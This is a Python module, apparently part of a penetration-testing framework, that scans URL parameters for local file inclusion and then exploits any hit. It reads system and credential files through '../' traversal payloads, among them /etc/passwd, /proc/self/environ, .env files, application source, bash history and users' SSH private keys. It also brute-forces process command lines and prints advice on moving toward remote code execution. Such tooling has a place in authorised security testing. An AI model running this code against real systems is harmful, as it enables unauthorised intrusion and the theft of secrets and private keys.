import re
import asyncio
from typing import AsyncIterator
from urllib.parse import parse_qs, quote, urlparse, urlunparse
from nexhunt.adapters.base import ToolAdapter
from nexhunt.services import lfi_engine


_FOLLOWUP_PATHS = [
    "etc/passwd",
    "proc/self/cmdline",
    "proc/self/environ",
    "proc/self/status",
    "proc/self/cwd/app.py",
    "proc/self/cwd/main.py",
    "proc/self/cwd/config.py",
    "proc/self/cwd/.env",
    "proc/self/cwd/requirements.txt",
    "etc/hostname",
    "etc/hosts",
    "etc/crontab",
    "proc/net/tcp",
    "proc/net/udp",
    "var/log/nginx/access.log",
    "var/log/nginx/error.log",
    "var/log/apache2/access.log",
    "var/log/apache2/error.log",
]


def _parse_headers(raw: str) -> dict[str, str]:
    headers: dict[str, str] = {}
    if not raw:
        return headers
    for part in raw.replace("\n", ",").split(","):
        part = part.strip()
        if not part or ":" not in part:
            continue
        name, _, value = part.partition(":")
        if name.strip() and value.strip():
            headers[name.strip()] = value.strip()
    return headers


def _build_param_url(url: str, param_name: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    parts = []
    for key, values in params.items():
        current = value if key == param_name else (values[0] if values else "")
        parts.append(f"{quote(key)}={current if key == param_name else quote(current)}")
    return urlunparse(parsed._replace(query="&".join(parts)))


def _depth_from_payload(payload: str) -> int:
    marker = "../"
    count = payload.count(marker)
    return count if count > 0 else 6


def _root_path_from_payload(payload: str) -> str:
    payload = payload.split("%00", 1)[0]
    payload = payload.replace("\\", "/")
    payload = re.sub(r"^(\.\./|%2e%2e%2f|%252e%252e%252f|\.\.\.\.//|\.\.;/|\.\.%c0%af)+", "", payload, flags=re.I)
    return payload.lstrip("/")


def _clean_snippet(text: str, limit: int = 700) -> str:
    text = text.replace("\x00", " ").replace("\r", "")
    text = "\n".join(line.rstrip() for line in text.splitlines())
    if len(text) > limit:
        return text[:limit].rstrip() + "\n  ... [truncated]"
    return text


def _interesting_file_read(body: str, baseline: str, path: str) -> bool:
    if not body or body.strip() in {"Page not found", "Not found", "404"}:
        return False
    if body == baseline:
        return False
    lowered = body.lower()
    if "page not found" in lowered or "no such file" in lowered:
        return False
    signatures = (
        "root:x:0:0:", "127.0.0.1", "invocation_id=", "journal_stream=", "python",
        "[boot loader]", "shell=/bin/sh", "localhost", "flask", "werkzeug",
        "from flask", "app.run", "secret_key", "database_url", "password=",
        "token=", "debug=", "listen", "local_address", "uid:", "name:",
    )
    if any(sig in lowered for sig in signatures):
        return True
    if path.endswith(("proc/net/tcp", "proc/net/udp")) and "local_address" in lowered:
        return True
    if path.endswith((".env", ".py", ".txt", ".conf", ".ini")) and len(body.strip()) > 10:
        return True
    short_paths = ("hostname", "cmdline", "status")
    return any(path.endswith(p) for p in short_paths) and 0 < len(body.strip()) < 5000


def _parse_env_users(text: str) -> list[str]:
    users = []
    for key in ("USER", "LOGNAME"):
        match = re.search(rf"(?:^|\x00|\s){key}=([A-Za-z0-9_.-]+)", text)
        if match:
            users.append(match.group(1))
    home = re.search(r"(?:^|\x00|\s)HOME=/home/([A-Za-z0-9_.-]+)", text)
    if home:
        users.append(home.group(1))
    return list(dict.fromkeys(users))


def _parse_passwd_users(text: str) -> list[str]:
    users = []
    for line in text.splitlines():
        parts = line.split(":")
        if len(parts) >= 7 and parts[5].startswith("/home/"):
            users.append(parts[0])
    return list(dict.fromkeys(users))


def _parse_cmdline(text: str) -> list[str]:
    return [part for part in re.split(r"[\x00\s]+", text.strip()) if part]


def _decode_proc_net_tcp(text: str) -> list[dict]:
    states = {
        "01": "ESTABLISHED",
        "02": "SYN_SENT",
        "03": "SYN_RECV",
        "04": "FIN_WAIT1",
        "05": "FIN_WAIT2",
        "06": "TIME_WAIT",
        "07": "CLOSE",
        "08": "CLOSE_WAIT",
        "09": "LAST_ACK",
        "0A": "LISTEN",
        "0B": "CLOSING",
    }
    sockets = []
    for line in text.splitlines()[1:]:
        cols = line.split()
        if len(cols) < 10 or ":" not in cols[1]:
            continue
        addr_hex, port_hex = cols[1].split(":", 1)
        state = states.get(cols[3], cols[3])
        try:
            port = int(port_hex, 16)
            octets = [str(int(addr_hex[i:i + 2], 16)) for i in range(6, -1, -2)]
            uid = int(cols[7])
        except ValueError:
            continue
        sockets.append({
            "host": ".".join(octets),
            "port": port,
            "state": state,
            "uid": uid,
            "inode": cols[9],
        })
    return sockets


def _read_map(reads: list[dict]) -> dict[str, str]:
    return {
        item["path"]: item.get("content") or item.get("snippet", "")
        for item in reads
        if item.get("content") or item.get("snippet")
    }


def _derive_followup_paths(reads: list[dict]) -> list[str]:
    blobs = _read_map(reads)
    users: list[str] = []
    if "proc/self/environ" in blobs:
        users.extend(_parse_env_users(blobs["proc/self/environ"]))
    if "etc/passwd" in blobs:
        users.extend(_parse_passwd_users(blobs["etc/passwd"]))

    paths: list[str] = []
    for user in dict.fromkeys(users):
        paths.extend([
            f"home/{user}/.ssh/id_rsa",
            f"home/{user}/.ssh/id_ed25519",
            f"home/{user}/.ssh/authorized_keys",
            f"home/{user}/.bash_history",
            f"home/{user}/.profile",
            f"home/{user}/app.py",
            f"home/{user}/main.py",
            f"home/{user}/config.py",
            f"home/{user}/.env",
        ])

    cmd_parts = _parse_cmdline(blobs.get("proc/self/cmdline", ""))
    for part in cmd_parts:
        if part.endswith((".py", ".ini", ".cfg", ".conf")):
            paths.extend([
                f"proc/self/cwd/{part.lstrip('./')}",
                part.lstrip("/"),
            ])
    return list(dict.fromkeys(paths))


def _ports_for_pid_scan(reads: list[dict]) -> list[int]:
    blobs = _read_map(reads)
    common = {22, 53, 80, 443, 631, 8000, 8008, 8080, 8443}
    candidates: list[int] = []
    for proc_path in ("proc/net/tcp", "proc/net/udp"):
        for socket in _decode_proc_net_tcp(blobs.get(proc_path, "")):
            port = socket["port"]
            if socket["state"] != "LISTEN" or port in common:
                continue
            candidates.append(port)
    return list(dict.fromkeys(candidates))


async def _scan_pid_cmdlines(
    url: str,
    param: str,
    headers: dict,
    baseline: str,
    depth: int,
    ports: list[int],
    pid_max: int,
) -> list[dict]:
    import asyncio
    import httpx

    if not ports or pid_max <= 0:
        return []

    ports_text = [str(port) for port in ports]
    sem = asyncio.Semaphore(8)

    async def check_pid(pid: int):
        path = f"proc/{pid}/cmdline"
        payload = "../" * depth + path
        read_url = _build_param_url(url, param, payload)
        async with sem:
            try:
                resp = await pid_client.get(read_url, headers=headers)
            except Exception:
                return None
        body = resp.text
        if resp.status_code != 200 or body == baseline:
            return None
        if not any(port in body for port in ports_text):
            return None
        return {
            "path": path,
            "payload": payload,
            "status": resp.status_code,
            "bytes": len(resp.content),
            "snippet": _clean_snippet(body, limit=500),
            "kind": "process",
            "matched_ports": [port for port in ports if str(port) in body],
        }

    hits = []
    batch_size = 96
    limits = httpx.Limits(max_connections=80, max_keepalive_connections=0)
    timeout = httpx.Timeout(2.5, connect=1.0)
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout, limits=limits) as pid_client:
        for start in range(1, pid_max + 1, batch_size):
            stop = min(start + batch_size, pid_max + 1)
            tasks = [asyncio.create_task(check_pid(pid)) for pid in range(start, stop)]
            for task in asyncio.as_completed(tasks):
                result = await task
                if result:
                    hits.append(result)
                    for pending in tasks:
                        if not pending.done():
                            pending.cancel()
                    await asyncio.gather(*tasks, return_exceptions=True)
                    return hits
    return hits


def _analyze_reads(first_finding: dict, reads: list[dict]) -> list[str]:
    blobs = _read_map(reads)
    notes = []
    payload = first_finding.get("payload", "")
    root_path = _root_path_from_payload(payload)
    depth = _depth_from_payload(payload)
    notes.append(f"Working payload reaches /{root_path or '?'} with traversal depth {depth}.")

    stack_bits = []
    joined = "\n".join(blobs.values()).lower()
    if "werkzeug" in joined or "flask" in joined or "from flask" in joined:
        stack_bits.append("Python/Flask/Werkzeug")
    elif "python" in joined or "app.py" in joined:
        stack_bits.append("Python")
    if "apache" in joined:
        stack_bits.append("Apache")
    if "nginx" in joined:
        stack_bits.append("Nginx")
    if stack_bits:
        notes.append("Likely stack: " + ", ".join(dict.fromkeys(stack_bits)) + ".")

    users = []
    if "proc/self/environ" in blobs:
        users.extend(_parse_env_users(blobs["proc/self/environ"]))
    if "etc/passwd" in blobs:
        users.extend(_parse_passwd_users(blobs["etc/passwd"]))
    if users:
        notes.append("Useful local user(s): " + ", ".join(dict.fromkeys(users)) + ".")

    if "proc/self/cmdline" in blobs:
        cmd = " ".join(_parse_cmdline(blobs["proc/self/cmdline"]))
        if cmd:
            notes.append(f"Process command line: {cmd}.")

    for proc_path in ("proc/net/tcp", "proc/net/udp"):
        if proc_path not in blobs:
            continue
        listen = [s for s in _decode_proc_net_tcp(blobs[proc_path]) if s["state"] == "LISTEN"]
        if listen:
            ports = ", ".join(f"{s['host']}:{s['port']} uid={s['uid']} inode={s['inode']}" for s in listen[:10])
            notes.append(f"Listening sockets from /{proc_path}: {ports}.")

    process_hits = [item for item in reads if item.get("kind") == "process"]
    for hit in process_hits[:5]:
        cmd = " ".join(_parse_cmdline(hit.get("snippet", "")))
        ports = ", ".join(str(port) for port in hit.get("matched_ports", []))
        notes.append(f"Process clue: /{hit['path']} mentions port {ports}: {cmd}.")

    if any("python" in note.lower() or "flask" in note.lower() for note in notes):
        notes.append("RCE paths should focus on readable source/config, secrets, internal services, or upload/log flows; PHP wrapper tricks are unlikely on this stack.")
    else:
        notes.append("Next move: read app source/config, environment, logs, and user files before trying stack-specific RCE techniques.")
    return notes


async def _followup_file_reads(
    url: str,
    first_finding: dict,
    headers: dict,
    extra_paths: list[str] | None,
):
    import httpx

    param = first_finding.get("parameter")
    if not param:
        return []
    depth = _depth_from_payload(first_finding.get("payload", ""))
    paths = list(dict.fromkeys(_FOLLOWUP_PATHS + [p.strip().lstrip("/\\") for p in (extra_paths or []) if p.strip()]))
    out = []

    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=12) as client:
        try:
            baseline = (await client.get(url, headers=headers)).text
        except Exception:
            baseline = ""

        async def try_paths(candidates: list[str]):
            new_reads = []
            for path in candidates:
                if any(item.get("path") == path for item in out):
                    continue
                found = None
                for d in dict.fromkeys([depth, 4, 6, 8, 10]):
                    payload = "../" * d + path
                    read_url = _build_param_url(url, param, payload)
                    try:
                        resp = await client.get(read_url, headers=headers)
                    except Exception as e:
                        found = {"path": path, "error": str(e)}
                        break
                    if resp.status_code == 200 and _interesting_file_read(resp.text, baseline, path):
                        found = {
                            "path": path,
                            "payload": payload,
                            "status": resp.status_code,
                            "bytes": len(resp.content),
                            "content": resp.text,
                            "snippet": _clean_snippet(resp.text),
                        }
                        break
                if found:
                    new_reads.append(found)
            out.extend(new_reads)

        await try_paths(paths)
        derived_paths = _derive_followup_paths(out)
        if derived_paths:
            await try_paths(derived_paths)

    return out


def _to_finding(f: dict, url: str) -> dict:
    conf = f.get("confidence", "confirmed")
    severity = "high" if conf == "confirmed" else "medium"
    return {
        "_raw": False, "id": None,
        "title": f"[LFI] {f.get('technique')} — param: {f.get('parameter')}",
        "severity": severity, "vuln_type": "lfi",
        "url": f.get("original_url") or url, "parameter": f.get("parameter"),
        "evidence": (
            f"Technique: {f.get('technique')}\n"
            f"Payload: {f.get('payload')}\n"
            f"Status: {f.get('status_code')}  Confidence: {conf}\n"
            f"Evidence:\n{f.get('evidence')}\n\n"
            f"PoC: {f.get('url')}"
        ),
        "description": (
            "Local File Inclusion / path traversal: the parameter reflects file "
            "content from the server filesystem. "
            + ("Confirmed by file-content signature." if conf == "confirmed"
               else "Tentative (baseline differential) — confirm manually.")
        ),
        "tool": "lfi", "template_id": f"lfi-{f.get('technique')}", "status": "new",
    }


def _format_probe_progress(event: dict) -> str | None:
    name = event.get("event")
    if name == "baseline":
        params = ", ".join(event.get("params") or [])
        return f"  Baseline request... params: {params} | tests: {event.get('total_tests', 0)}"
    if name == "baseline_done":
        return f"  Baseline OK: HTTP {event.get('status_code')} ({event.get('bytes')} bytes)"
    if name == "baseline_error":
        return f"  [!] baseline error: {event.get('error')}"
    if name == "param_start":
        return f"  Testing param {event.get('parameter')} ({event.get('param_index')}/{event.get('param_total')})"
    if name == "payload":
        payload = str(event.get("payload", ""))
        if len(payload) > 90:
            payload = payload[:87] + "..."
        return (
            f"    try {event.get('checked')}/{event.get('total_tests')} "
            f"{event.get('technique')} -> {event.get('parameter')}={payload}"
        )
    if name == "payload_error":
        return (
            f"    [timeout/error] {event.get('technique')} "
            f"{event.get('checked')}/{event.get('total_tests')} — {event.get('error')}"
        )
    if name == "finding":
        return (
            f"  [+] confirmed during probe: {event.get('parameter')} via "
            f"{event.get('technique')} ({event.get('confidence')})"
        )
    if name == "complete":
        return (
            f"  Probe complete: checked {event.get('checked')}/{event.get('total_tests')} "
            f"payload attempts, findings={event.get('findings')}"
        )
    return None


class LfiAdapter(ToolAdapter):
    name = "lfi"
    binary_name = ""
    result_type = "finding"

    async def check_installed(self) -> bool:
        return True

    async def run(self, target: str, options: dict) -> AsyncIterator[dict]:
        url = target.strip()
        if "://" not in url:
            url = f"http://{url}"
        yield {"_raw": True, "line": f"$ lfi-scan {url}"}

        if "?" not in url or "=" not in url:
            yield {"_raw": True, "line": "  [!] no query parameters to test — pass a URL like https://host/page?file=x"}
            return

        extra = options.get("wordlist") or options.get("extra_paths")
        if isinstance(extra, str):
            extra = [p for p in extra.splitlines() if p.strip()]
        try:
            pid_max = int(options.get("pid_max") or 1500)
        except (TypeError, ValueError):
            pid_max = 1500
        pid_max = max(0, min(pid_max, 60000))
        try:
            progress_every = int(options.get("progress_every") or 10)
        except (TypeError, ValueError):
            progress_every = 10
        progress_every = max(1, min(progress_every, 250))

        headers = _parse_headers(options.get("headers", "") or options.get("session_headers", ""))
        cookie = options.get("cookie") or options.get("session_cookies")
        if cookie:
            headers["Cookie"] = cookie

        payloads = lfi_engine.generate_payloads(extra_wordlist=extra, thorough=True)
        params = lfi_engine.rank_params(parse_qs(urlparse(url).query, keep_blank_values=True))
        yield {"_raw": True, "line": f"  Plan: {len(params)} parameter(s), {len(payloads)} payloads per parameter max"}
        if params:
            yield {"_raw": True, "line": f"  Params: {', '.join(params[:12])}"}

        progress_queue: asyncio.Queue[dict] = asyncio.Queue()

        async def progress_cb(event: dict):
            await progress_queue.put(event)

        probe_task = asyncio.create_task(lfi_engine.probe_url(
            url,
            headers=headers,
            extra_wordlist=extra,
            thorough=True,
            progress_cb=progress_cb,
            progress_every=progress_every,
        ))

        try:
            while True:
                if probe_task.done() and progress_queue.empty():
                    break
                try:
                    event = await asyncio.wait_for(progress_queue.get(), timeout=0.25)
                except asyncio.TimeoutError:
                    continue
                line = _format_probe_progress(event)
                if line:
                    yield {"_raw": True, "line": line}
            findings = await probe_task
        except Exception as e:
            if not probe_task.done():
                probe_task.cancel()
            yield {"_raw": True, "line": f"  [!] error: {e}"}
            return

        if not findings:
            yield {"_raw": True, "line": "  no LFI detected"}
            return

        for f in findings:
            yield {"_raw": True, "line": f"  [+] {f['parameter']} via {f['technique']} — {f['payload']}"}
            yield _to_finding(f, url)

        followups = await _followup_file_reads(url, findings[0], headers, extra)
        if followups:
            yield {"_raw": True, "line": "  Post-confirm file reads:"}
            for item in followups:
                if item.get("error"):
                    yield {"_raw": True, "line": f"    [!] {item['path']}: {item['error']}"}
                    continue
                yield {"_raw": True, "line": f"    [+] /{item['path']} ({item['bytes']} bytes) via {item['payload']}"}
                for line in item["snippet"].splitlines()[:12]:
                    yield {"_raw": True, "line": f"        {line}"}

            yield {"_raw": True, "line": "  Analysis:"}
            for note in _analyze_reads(findings[0], followups):
                yield {"_raw": True, "line": f"    [>] {note}"}

            ports = _ports_for_pid_scan(followups)
            if ports and pid_max > 0:
                yield {
                    "_raw": True,
                    "line": (
                        "  Deep PID scan: searching /proc/1.."
                        f"{pid_max}/cmdline for odd listening port(s): "
                        f"{', '.join(str(port) for port in ports)}"
                    ),
                }
                process_hits = await _scan_pid_cmdlines(url, findings[0]["parameter"], headers, "", _depth_from_payload(findings[0].get("payload", "")), ports, pid_max)
                if process_hits:
                    yield {"_raw": True, "line": "  Process clues:"}
                    for hit in process_hits:
                        yield {"_raw": True, "line": f"    [+] /{hit['path']} mentions {', '.join(str(p) for p in hit.get('matched_ports', []))}"}
                        for line in hit["snippet"].splitlines()[:8]:
                            yield {"_raw": True, "line": f"        {line}"}
                    yield {"_raw": True, "line": "  Updated analysis:"}
                    for note in _analyze_reads(findings[0], followups + process_hits):
                        if "Process clue:" in note:
                            yield {"_raw": True, "line": f"    [>] {note}"}
                else:
                    yield {"_raw": True, "line": "    [-] no process command line matched those ports in the selected PID range"}
